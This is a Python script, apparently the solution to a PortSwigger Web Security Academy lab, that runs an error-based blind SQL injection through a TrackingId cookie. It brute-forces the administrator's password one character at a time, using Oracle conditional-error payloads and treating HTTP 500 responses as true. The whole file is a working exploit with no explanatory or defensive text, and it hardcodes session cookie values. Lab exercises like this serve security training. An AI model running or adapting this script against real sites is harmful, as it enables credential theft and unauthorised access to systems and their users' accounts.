import requests

# Target URL
url = 'https://0ae200c504709ad180914e480014005d.web-security-academy.net/filter?category=Pets'

# Expanded character set
characters = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()-_=+"

# Cookie values (Modify if needed)
base_cookie = {
    'TrackingId': 'DmKaYCpZRIoKOY5s',
    'session': 'ngwoU80cqk5FfXS2JlmUDqEjKJtkSFlY'
}

def send_request(payload):
    """ Sends an HTTP request with the given SQL payload """
    try:
        cookie = base_cookie.copy()
        cookie['TrackingId'] += payload
        r = requests.get(url, cookies=cookie, timeout=5)  # Added timeout
        return r.status_code == 500  # Error indicates true condition
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        return False

def get_data(length):
    """ Retrieves password using an optimized character search """
    temp = ""
    for i in range(1, length + 1):
        for char in characters:
            payload = f"'||(SELECT CASE WHEN substr((SELECT password FROM users WHERE username='administrator'), {i}, 1)='{char}' THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||'"
            if send_request(payload):
                temp += char
                print(f"Extracted so far: {temp}")
                break  # Move to the next character
    return temp

print("Dumping data... please be patient!")
data = get_data(20)
print(f"Got it! Password: {data}")
